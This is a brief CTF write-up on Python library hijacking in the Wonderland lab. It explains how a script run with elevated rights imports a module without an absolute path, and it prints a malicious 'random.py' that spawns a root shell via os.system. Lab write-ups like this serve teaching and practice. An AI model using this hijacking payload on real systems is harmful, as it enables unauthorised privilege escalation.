---
title: "Wonderland CTF: Python Library Hijacking"
date: "2025-10-15"
tags: ["Vectors", "Red Team", "Ops"]
---

Privilege escalation often hides in plain sight. In the Wonderland CTF, the user `rabbit` was running a Python script as root, but without an absolute path for the import.

### The Vulnerability

When Python imports a module (e.g., `import random`), it checks the current directory first. If we create a fake `random.py` in the same folder, the script will execute *our* code instead of the library.

### The Exploit

We created a malicious file to hijack the execution flow:

<CodeWindow title="random.py" lang="python">
{`import os

# When the root script imports 'random', this runs immediately
# Spawning a root shell
os.system("/bin/bash")`}
</CodeWindow>

Running the script as the target user gave us an instant **Root Shell**.